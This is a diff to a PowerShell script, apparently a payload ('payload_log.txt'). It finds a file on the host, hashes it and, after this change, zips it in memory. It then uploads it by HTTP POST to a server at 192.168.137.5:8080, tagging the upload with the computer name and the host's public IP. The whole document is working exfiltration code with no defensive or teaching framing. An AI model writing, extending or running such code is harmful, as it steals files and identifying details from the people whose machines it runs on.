@@ -2,6 +2,9 @@
     $logFile = "$env:TEMP\payload_log.txt"
     Add-Content $logFile "=== Script started at $(Get-Date) ==="
 
+    # Load required assembly for compression
+    Add-Type -AssemblyName System.IO.Compression.FileSystem
+
     # Get public IP (optional)
     try {
         $p = (Invoke-WebRequest https://api.ipify.org -UseBasicParsing -TimeoutSec 5 | Select -Exp Content)
@@ -18,38 +21,48 @@
 
     if ($f) {
         Add-Content $logFile "Found file: $($f.FullName)"
-        # Read the file as raw bytes
-        $bytes = [System.IO.File]::ReadAllBytes($f.FullName)
-
-        # Write first 100 bytes to log
-        $first100 = [System.BitConverter]::ToString($bytes[0..([Math]::Min(99, $bytes.Length-1))])
-        Add-Content $logFile "First 100 bytes: $first100"
-
-        Add-Content $logFile "Bytes read: $($bytes.Length)"
-        # Compute SHA256 hash of the file
+        # Read file bytes
+        $originalBytes = [System.IO.File]::ReadAllBytes($f.FullName)
+        Add-Content $logFile "Original bytes: $($originalBytes.Length)"
+        # Compute SHA256 of original file
         $sha256 = [System.Security.Cryptography.SHA256]::Create()
-        $hash = $sha256.ComputeHash($bytes)
+        $hash = $sha256.ComputeHash($originalBytes)
         $hashString = [System.BitConverter]::ToString($hash).Replace("-", "").ToLower()
-        Add-Content $logFile "SHA256 of file: $hashString"
+        Add-Content $logFile "Original SHA256: $hashString"
+
+        # Create in-memory zip archive
+        $zipStream = New-Object System.IO.MemoryStream
+        $zipArchive = [System.IO.Compression.ZipArchive]::new($zipStream, [System.IO.Compression.ZipArchiveMode]::Create, $true)
+        # Add entry with the file name (just the name, no path)
+        $entry = $zipArchive.CreateEntry($f.Name)
+        # Write file content into the entry
+        $entryStream = $entry.Open()
+        $entryStream.Write($originalBytes, 0, $originalBytes.Length)
+        $entryStream.Close()
+        $zipArchive.Dispose()
+        # Get zip bytes
+        $zipBytes = $zipStream.ToArray()
+        $zipStream.Close()
+        Add-Content $logFile "Zip bytes: $($zipBytes.Length)"
     } else {
         Add-Content $logFile "No file found. Sending 'Not found'"
-        $bytes = [System.Text.Encoding]::UTF8.GetBytes('Not found')
+        $zipBytes = [System.Text.Encoding]::UTF8.GetBytes('Not found')
         $hashString = "none"
     }
 
     # Build the URI with the computer name
     $u = "http://192.168.137.5:8080/$env:COMPUTERNAME"
 
-    # Create a WebClient and set headers
+    # Create WebClient
     $wc = New-Object System.Net.WebClient
     $wc.Headers.Add('X-Message', 'Jeeva Halal')
     $wc.Headers.Add('X-Public-IP', $p)
-    $wc.Headers.Add('X-File-Hash', $hashString)       # send hash for verification
-    $wc.Headers.Add('Content-Type', 'application/octet-stream')   # raw binary
+    $wc.Headers.Add('X-File-Hash', $hashString)   # hash of original file (for verification)
+    $wc.Headers.Add('Content-Type', 'application/octet-stream')
 
-    # Upload raw bytes
+    # Upload zip bytes
     try {
-        $response = $wc.UploadData($u, 'POST', $bytes)
+        $response = $wc.UploadData($u, 'POST', $zipBytes)
         Add-Content $logFile "UploadData succeeded. Response: $([System.Text.Encoding]::UTF8.GetString($response))"
     } catch {
         Add-Content $logFile "UploadData failed: $_"
